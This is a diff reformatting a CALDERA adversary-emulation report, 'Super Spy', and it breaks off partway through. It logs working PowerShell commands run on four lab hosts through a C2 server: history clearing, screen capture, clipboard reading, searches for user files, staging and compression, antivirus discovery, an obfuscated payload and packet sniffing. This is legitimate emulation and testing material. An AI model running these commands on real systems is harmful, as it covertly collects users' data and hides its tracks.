@@ -2,925 +2,853 @@
 Super Spy
 =========
 
-Contents
-========
+# CALDERA Operation Report
 
-* [Hosts Attacked](#hosts-attacked)
-* [Links](#links)
-	* [Host: ACME-HH-ZYQ](#host-acme-hh-zyq)
-	* [Host: ACME-HH-EUO](#host-acme-hh-euo)
-	* [Host: ACME-WS-PLU](#host-acme-ws-plu)
-	* [Host: ACME-HH-ESO](#host-acme-hh-eso)
-* [Steps](#steps)
-	* [Host: ACME-HH-ZYQ (paw: kwmxux)](#host-acme-hh-zyq-paw-kwmxux)
-		* [  Description: capture the contents of the screen](#--description-capture-the-contents-of-the-screen)
-		* [  Description: copy the contents for the clipboard and print them](#--description-copy-the-contents-for-the-clipboard-and-print-them)
-		* [  Description: create a directory for exfil staging](#--description-create-a-directory-for-exfil-staging)
-		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
-		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
-		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
-		* [  Description: Identify AV](#--description-identify-av)
-		* [  Description: View all potential WIFI networks on host](#--description-view-all-potential-wifi-networks-on-host)
-		* [  Description: See the most used WIFI networks of a machine](#--description-see-the-most-used-wifi-networks-of-a-machine)
-	* [Host: ACME-HH-EUO (paw: acpuoe)](#host-acme-hh-euo-paw-acpuoe)
-		* [  Description: capture the contents of the screen](#--description-capture-the-contents-of-the-screen)
-		* [  Description: copy the contents for the clipboard and print them](#--description-copy-the-contents-for-the-clipboard-and-print-them)
-		* [  Description: create a directory for exfil staging](#--description-create-a-directory-for-exfil-staging)
-		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
-		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
-		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
-		* [  Description: Compress a directory on the file system](#--description-compress-a-directory-on-the-file-system)
-		* [  Description: Identify AV](#--description-identify-av)
-		* [  Description: View all potential WIFI networks on host](#--description-view-all-potential-wifi-networks-on-host)
-		* [  Description: See the most used WIFI networks of a machine](#--description-see-the-most-used-wifi-networks-of-a-machine)
-		* [  Description: Perform a packet capture](#--description-perform-a-packet-capture)
-	* [Host: ACME-WS-PLU (paw: hkrmxr)](#host-acme-ws-plu-paw-hkrmxr)
-		* [  Description: capture the contents of the screen](#--description-capture-the-contents-of-the-screen)
-		* [  Description: copy the contents for the clipboard and print them](#--description-copy-the-contents-for-the-clipboard-and-print-them)
-		* [  Description: create a directory for exfil staging](#--description-create-a-directory-for-exfil-staging)
-		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
-		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
-		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
-		* [  Description: copy files to staging directory](#--description-copy-files-to-staging-directory)
-		* [  Description: copy files to staging directory](#--description-copy-files-to-staging-directory)
-		* [  Description: copy files to staging directory](#--description-copy-files-to-staging-directory)
-		* [  Description: Compress a directory on the file system](#--description-compress-a-directory-on-the-file-system)
-		* [  Description: Exfil the staged directory](#--description-exfil-the-staged-directory)
-		* [  Description: Identify AV](#--description-identify-av)
-		* [  Description: View all potential WIFI networks on host](#--description-view-all-potential-wifi-networks-on-host)
-		* [  Description: See the most used WIFI networks of a machine](#--description-see-the-most-used-wifi-networks-of-a-machine)
-		* [  Description: Perform a packet capture](#--description-perform-a-packet-capture)
-	* [Host: ACME-HH-ESO (paw: nowkww)](#host-acme-hh-eso-paw-nowkww)
-		* [  Description: capture the contents of the screen](#--description-capture-the-contents-of-the-screen)
-		* [  Description: copy the contents for the clipboard and print them](#--description-copy-the-contents-for-the-clipboard-and-print-them)
-		* [  Description: create a directory for exfil staging](#--description-create-a-directory-for-exfil-staging)
-		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
-		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
-		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
-		* [  Description: Compress a directory on the file system](#--description-compress-a-directory-on-the-file-system)
-		* [  Description: Identify AV](#--description-identify-av)
-		* [  Description: View all potential WIFI networks on host](#--description-view-all-potential-wifi-networks-on-host)
-		* [  Description: See the most used WIFI networks of a machine](#--description-see-the-most-used-wifi-networks-of-a-machine)
 
+**Operation:** Super Spy<br>**Start:** 2024-09-13T18:21:57Z<br>**Adversary:** Super Spy
 # Hosts Attacked
 
-|Host|User|Beachhead Command|PID|Parent PID|IP|C2 Server|
+|Host|User|Beachhead Cmd|PID|Parent PID|IPs|C2 Server|
 | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
 |ACME-HH-ZYQ|ACME\grantj|splunkd.exe|3872|4840|172.31.45.222|http://172.31.10.226:8888|
 |ACME-HH-EUO|ACME\grantj|splunkd.exe|1052|2004|172.31.41.178|http://172.31.10.226:8888|
 |ACME-WS-PLU|ACME\grantj|splunkd.exe|1116|8312|172.31.11.139, 172.25.240.1|http://172.31.10.226:8888|
 |ACME-HH-ESO|ACME\grantj|splunkd.exe|8376|8992|172.31.39.111|http://172.31.10.226:8888|
 
-# Links
+# Execution Timeline
 
-(what exactly is a link? seems to be a command executed when initializing the beachhead?)
-## Host: ACME-HH-ZYQ
 
+**[LINK] ACME-HH-ZYQ (kwmxux)**
 
-  Technique: Indicator Removal on Host: Clear Command History
+**Command:** `Clear-History;Clear`
 
-  PID: 2304
+**Description:** N/A
 
-  Status: Success
+**Technique:** Indicator Removal on Host: Clear Command History
 
-  Start: 2024-09-04T03:18:40Z
+**ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)
 
-  Finish: 2024-09-04T03:18:40Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Clear-History;Clear
-```
+**PID:** 2304
 
+**Time:** 2024-09-04T03:18:40Z → 2024-09-04T03:18:40Z
 
-## Host: ACME-HH-EUO
 
+**[LINK] ACME-HH-EUO (acpuoe)**
 
-  Technique: Indicator Removal on Host: Clear Command History
+**Command:** `Clear-History;Clear`
 
-  PID: 4324
+**Description:** N/A
 
-  Status: Success
+**Technique:** Indicator Removal on Host: Clear Command History
 
-  Start: 2024-09-13T17:10:22Z
+**ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)
 
-  Finish: 2024-09-13T17:10:22Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Clear-History;Clear
-```
+**PID:** 4324
 
+**Time:** 2024-09-13T17:10:22Z → 2024-09-13T17:10:22Z
 
-## Host: ACME-WS-PLU
 
+**[LINK] ACME-WS-PLU (hkrmxr)**
 
-  Technique: Indicator Removal on Host: Clear Command History
+**Command:** `Clear-History;Clear`
 
-  PID: 8504
+**Description:** N/A
 
-  Status: Success
+**Technique:** Indicator Removal on Host: Clear Command History
 
-  Start: 2024-09-13T17:12:11Z
+**ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)
 
-  Finish: 2024-09-13T17:12:12Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Clear-History;Clear
-```
+**PID:** 8504
 
+**Time:** 2024-09-13T17:12:11Z → 2024-09-13T17:12:12Z
 
-## Host: ACME-HH-ESO
 
+**[LINK] ACME-HH-ESO (nowkww)**
 
-  Technique: Indicator Removal on Host: Clear Command History
+**Command:** `Clear-History;Clear`
 
-  PID: 10164
+**Description:** N/A
 
-  Status: Success
+**Technique:** Indicator Removal on Host: Clear Command History
 
-  Start: 2024-09-13T17:15:40Z
+**ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)
 
-  Finish: 2024-09-13T17:15:40Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Clear-History;Clear
-```
+**PID:** 10164
 
+**Time:** 2024-09-13T17:15:40Z → 2024-09-13T17:15:40Z
 
-# Steps
 
-## Host: ACME-HH-ZYQ (paw: kwmxux)
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-###   Description: capture the contents of the screen
+**Command:** `$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = "$HOME\Desktop\screenshot.png";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;`
 
+**Description:** capture the contents of the screen
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Screen Capture', 'technique_id': 'T1113'}
+**Technique:** Screen Capture
 
-  Status: Success
+**ATT&CK:** [T1113](https://attack.mitre.org/techniques/T1113)
 
-  PID: 792
+**Status:** `Success`
 
-  Start: 2024-09-13T18:22:34Z
+**PID:** 792
 
-  Command: 
-```powershell
-$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = "$HOME\Desktop\screenshot.png";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;
-```
+**Time:** 2024-09-13T18:22:34Z → N/A
 
 
-###   Description: copy the contents for the clipboard and print them
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
+**Command:** `Get-Clipboard -raw`
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Clipboard Data', 'technique_id': 'T1115'}
+**Description:** copy the contents for the clipboard and print them
 
-  Status: Success
+**Technique:** Clipboard Data
 
-  PID: 1260
+**ATT&CK:** [T1115](https://attack.mitre.org/techniques/T1115)
 
-  Start: 2024-09-13T18:23:13Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Get-Clipboard -raw
-```
+**PID:** 1260
 
+**Time:** 2024-09-13T18:23:13Z → N/A
 
-###   Description: create a directory for exfil staging
 
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}
+**Command:** `New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object`
 
-  Status: Failed
+**Description:** create a directory for exfil staging
 
-  PID: 3112
+**Technique:** Data Staged: Local Data Staging
 
-  Start: 2024-09-13T18:24:09Z
+**ATT&CK:** [T1074.001](https://attack.mitre.org/techniques/T1074/001)
 
-  Command: 
-```powershell
-New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
-```
+**Status:** `Failed`
 
+**PID:** 3112
 
-###   Description: Locate files deemed sensitive
+**Time:** 2024-09-13T18:24:09Z → N/A
 
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-  Status: Success
+**Command:** `Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;`
 
-  PID: 5520
+**Description:** Locate files deemed sensitive
 
-  Start: 2024-09-13T18:25:05Z
+**Technique:** Data from Local System
 
-  Command: 
-```powershell
-Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
-```
+**ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005)
 
+**Status:** `Success`
 
-###   Description: Locate files deemed sensitive
+**PID:** 5520
 
+**Time:** 2024-09-13T18:25:05Z → N/A
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}
 
-  Status: Success
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-  PID: 8376
+**Command:** `Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;`
 
-  Start: 2024-09-13T18:25:51Z
+**Description:** Locate files deemed sensitive
 
-  Command: 
-```powershell
-Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
-```
+**Technique:** Data from Local System
 
+**ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005)
 
-###   Description: Locate files deemed sensitive
+**Status:** `Success`
 
+**PID:** 8376
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}
+**Time:** 2024-09-13T18:25:51Z → N/A
 
-  Status: Success
 
-  PID: 8636
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-  Start: 2024-09-13T18:26:37Z
+**Command:** `Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;`
 
-  Command: 
-```powershell
-Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
-```
+**Description:** Locate files deemed sensitive
 
+**Technique:** Data from Local System
 
-###   Description: Identify AV
+**ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005)
 
+**Status:** `Success`
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}
+**PID:** 8636
 
-  Status: Failed
+**Time:** 2024-09-13T18:26:37Z → N/A
 
-  PID: 8324
 
-  Start: 2024-09-13T18:27:20Z
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-  Command: 
-```powershell
-wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
-```
+**Command:** `wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value`
 
+**Description:** Identify AV
 
-###   Description: View all potential WIFI networks on host
+**Technique:** Software Discovery: Security Software Discovery
 
+**ATT&CK:** [T1518.001](https://attack.mitre.org/techniques/T1518/001)
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}
+**Status:** `Failed`
 
-  Status: Failed
+**PID:** 8324
 
-  PID: 9028
+**Time:** 2024-09-13T18:27:20Z → N/A
 
-  Start: 2024-09-13T18:27:54Z
 
-  Command: 
-```powershell
-.\obfuscated_payload.ps1 -Scan
-```
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
+**Command:** `.\obfuscated_payload.ps1 -Scan`
 
-###   Description: See the most used WIFI networks of a machine
+**Description:** View all potential WIFI networks on host
 
+**Technique:** System Network Configuration Discovery
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}
+**ATT&CK:** [T1016](https://attack.mitre.org/techniques/T1016)
 
-  Status: Failed
+**Status:** `Failed`
 
-  PID: 4704
+**PID:** 9028
 
-  Start: 2024-09-13T18:28:57Z
+**Time:** 2024-09-13T18:27:54Z → N/A
 
-  Command: 
-```powershell
-.\wifi.ps1 -Pref
-```
 
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-## Host: ACME-HH-EUO (paw: acpuoe)
+**Command:** `.\wifi.ps1 -Pref`
 
-###   Description: capture the contents of the screen
+**Description:** See the most used WIFI networks of a machine
 
+**Technique:** System Network Configuration Discovery
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Screen Capture', 'technique_id': 'T1113'}
+**ATT&CK:** [T1016](https://attack.mitre.org/techniques/T1016)
 
-  Status: Success
+**Status:** `Failed`
 
-  PID: 5432
+**PID:** 4704
 
-  Start: 2024-09-13T18:22:31Z
+**Time:** 2024-09-13T18:28:57Z → N/A
 
-  Command: 
-```powershell
-$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = "$HOME\Desktop\screenshot.png";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;
-```
 
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-###   Description: copy the contents for the clipboard and print them
+**Command:** `$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = "$HOME\Desktop\screenshot.png";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;`
 
+**Description:** capture the contents of the screen
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Clipboard Data', 'technique_id': 'T1115'}
+**Technique:** Screen Capture
 
-  Status: Success
+**ATT&CK:** [T1113](https://attack.mitre.org/techniques/T1113)
 
-  PID: 6472
+**Status:** `Success`
 
-  Start: 2024-09-13T18:23:08Z
+**PID:** 5432
 
-  Command: 
-```powershell
-Get-Clipboard -raw
-```
+**Time:** 2024-09-13T18:22:31Z → N/A
 
 
-###   Description: create a directory for exfil staging
+**[STEP] ACME-HH-EUO (acpuoe)**
 
+**Command:** `Get-Clipboard -raw`
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}
+**Description:** copy the contents for the clipboard and print them
 
-  Status: Success
+**Technique:** Clipboard Data
 
-  PID: 4396
+**ATT&CK:** [T1115](https://attack.mitre.org/techniques/T1115)
 
-  Start: 2024-09-13T18:23:44Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
-```
+**PID:** 6472
 
+**Time:** 2024-09-13T18:23:08Z → N/A
 
-###   Description: Locate files deemed sensitive
 
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}
+**Command:** `New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object`
 
-  Status: Success
+**Description:** create a directory for exfil staging
 
-  PID: 3032
+**Technique:** Data Staged: Local Data Staging
 
-  Start: 2024-09-13T18:24:48Z
+**ATT&CK:** [T1074.001](https://attack.mitre.org/techniques/T1074/001)
 
-  Command: 
-```powershell
-Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
-```
+**Status:** `Success`
 
+**PID:** 4396
 
-###   Description: Locate files deemed sensitive
+**Time:** 2024-09-13T18:23:44Z → N/A
 
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-  Status: Success
+**Command:** `Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;`
 
-  PID: 5860
+**Description:** Locate files deemed sensitive
 
-  Start: 2024-09-13T18:25:49Z
+**Technique:** Data from Local System
 
-  Command: 
-```powershell
-Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
-```
+**ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005)
 
+**Status:** `Success`
 
-###   Description: Locate files deemed sensitive
+**PID:** 3032
 
+**Time:** 2024-09-13T18:24:48Z → N/A
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}
 
-  Status: Success
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-  PID: 4468
+**Command:** `Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;`
 
-  Start: 2024-09-13T18:26:36Z
+**Description:** Locate files deemed sensitive
 
-  Command: 
-```powershell
-Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
-```
+**Technique:** Data from Local System
 
+**ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005)
 
-###   Description: Compress a directory on the file system
+**Status:** `Success`
 
+**PID:** 5860
 
-  Attack: {'tactic': 'exfiltration', 'technique_name': 'Archive Collected Data: Archive via Utility', 'technique_id': 'T1560.001'}
+**Time:** 2024-09-13T18:25:49Z → N/A
 
-  Status: Failed
 
-  PID: 6956
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-  Start: 2024-09-13T18:27:41Z
+**Command:** `Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;`
 
-  Command: 
-```powershell
-Compress-Archive -Path C:\Windows\system32\staged -DestinationPath C:\Windows\system32\staged.zip -Force;sleep 1; ls C:\Windows\system32\staged.zip | foreach {$_.FullName} | select
-```
+**Description:** Locate files deemed sensitive
 
+**Technique:** Data from Local System
 
-###   Description: Identify AV
+**ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005)
 
+**Status:** `Success`
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}
+**PID:** 4468
 
-  Status: Failed
+**Time:** 2024-09-13T18:26:36Z → N/A
 
-  PID: 6208
 
-  Start: 2024-09-13T18:28:17Z
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-  Command: 
-```powershell
-wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
-```
+**Command:** `Compress-Archive -Path C:\Windows\system32\staged -DestinationPath C:\Windows\system32\staged.zip -Force;sleep 1; ls C:\Windows\system32\staged.zip | foreach {$_.FullName} | select`
 
+**Description:** Compress a directory on the file system
 
-###   Description: View all potential WIFI networks on host
+**Technique:** Archive Collected Data: Archive via Utility
 
+**ATT&CK:** [T1560.001](https://attack.mitre.org/techniques/T1560/001)
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}
+**Status:** `Failed`
 
-  Status: Failed
+**PID:** 6956
 
-  PID: 2188
+**Time:** 2024-09-13T18:27:41Z → N/A
 
-  Start: 2024-09-13T18:29:18Z
 
-  Command: 
-```powershell
-.\obfuscated_payload.ps1 -Scan
-```
+**[STEP] ACME-HH-EUO (acpuoe)**
 
+**Command:** `wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value`
 
-###   Description: See the most used WIFI networks of a machine
+**Description:** Identify AV
 
+**Technique:** Software Discovery: Security Software Discovery
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}
+**ATT&CK:** [T1518.001](https://attack.mitre.org/techniques/T1518/001)
 
-  Status: Success
+**Status:** `Failed`
 
-  PID: 5216
+**PID:** 6208
 
-  Start: 2024-09-13T18:30:00Z
+**Time:** 2024-09-13T18:28:17Z → N/A
 
-  Command: 
-```powershell
-.\wifi.ps1 -Pref
-```
 
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-###   Description: Perform a packet capture
+**Command:** `.\obfuscated_payload.ps1 -Scan`
 
+**Description:** View all potential WIFI networks on host
 
-  Attack: {'tactic': 'credential-access', 'technique_name': 'Network Sniffing', 'technique_id': 'T1040'}
+**Technique:** System Network Configuration Discovery
 
-  Status: Success
+**ATT&CK:** [T1016](https://attack.mitre.org/techniques/T1016)
 
-  PID: 3840
+**Status:** `Failed`
 
-  Start: 2024-09-13T18:32:12Z
+**PID:** 2188
 
-  Command: 
-```powershell
-$path = "$ENV:UserProfile\Desktop\pcap.etl";New-NetEventSession -Name "PCAP" -CaptureMode SaveToFile -LocalFilePath $path;Add-NetEventProvider -Name "Microsoft-Windows-TCPIP" -SessionName "PCAP";Start-NetEventSession -Name "PCAP";Start-Sleep -s 60;Stop-NetEventSession -Name "PCAP";if (Test-Path $path) {  echo $path;  exit 0;} else {  echo "Failed to generate PCAP file.";  exit 1;};
-```
+**Time:** 2024-09-13T18:29:18Z → N/A
 
 
-## Host: ACME-WS-PLU (paw: hkrmxr)
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-###   Description: capture the contents of the screen
+**Command:** `.\wifi.ps1 -Pref`
 
+**Description:** See the most used WIFI networks of a machine
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Screen Capture', 'technique_id': 'T1113'}
+**Technique:** System Network Configuration Discovery
 
-  Status: Success
+**ATT&CK:** [T1016](https://attack.mitre.org/techniques/T1016)
 
-  PID: 9912
+**Status:** `Success`
 
-  Start: 2024-09-13T18:22:15Z
+**PID:** 5216
 
-  Command: 
-```powershell
-$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = "$HOME\Desktop\screenshot.png";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;
-```
+**Time:** 2024-09-13T18:30:00Z → N/A
 
 
-###   Description: copy the contents for the clipboard and print them
+**[STEP] ACME-HH-EUO (acpuoe)**
 
+**Command:** `$path = "$ENV:UserProfile\Desktop\pcap.etl";New-NetEventSession -Name "PCAP" -CaptureMode SaveToFile -LocalFilePath $path;Add-NetEventProvider -Name "Microsoft-Windows-TCPIP" -SessionName "PCAP";Start-NetEventSession -Name "PCAP";Start-Sleep -s 60;Stop-NetEventSession -Name "PCAP";if (Test-Path $path) {  echo $path;  exit 0;} else {  echo "Failed to generate PCAP file.";  exit 1;};`
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Clipboard Data', 'technique_id': 'T1115'}
+**Description:** Perform a packet capture
 
-  Status: Success
+**Technique:** Network Sniffing
 
-  PID: 3504
+**ATT&CK:** [T1040](https://attack.mitre.org/techniques/T1040)
 
-  Start: 2024-09-13T18:23:18Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Get-Clipboard -raw
-```
+**PID:** 3840
 
+**Time:** 2024-09-13T18:32:12Z → N/A
 
-###   Description: create a directory for exfil staging
 
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}
+**Command:** `$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = "$HOME\Desktop\screenshot.png";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;`
 
-  Status: Success
+**Description:** capture the contents of the screen
 
-  PID: 8676
+**Technique:** Screen Capture
 
-  Start: 2024-09-13T18:24:02Z
+**ATT&CK:** [T1113](https://attack.mitre.org/techniques/T1113)
 
-  Command: 
-```powershell
-New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
-```
+**Status:** `Success`
 
+**PID:** 9912
 
-###   Description: Locate files deemed sensitive
+**Time:** 2024-09-13T18:22:15Z → N/A
 
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Status: Success
+**Command:** `Get-Clipboard -raw`
 
-  PID: 6552
+**Description:** copy the contents for the clipboard and print them
 
-  Start: 2024-09-13T18:25:06Z
+**Technique:** Clipboard Data
 
-  Command: 
-```powershell
-Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
-```
+**ATT&CK:** [T1115](https://attack.mitre.org/techniques/T1115)
 
+**Status:** `Success`
 
-###   Description: Locate files deemed sensitive
+**PID:** 3504
 
+**Time:** 2024-09-13T18:23:18Z → N/A
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}
 
-  Status: Success
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  PID: 6360
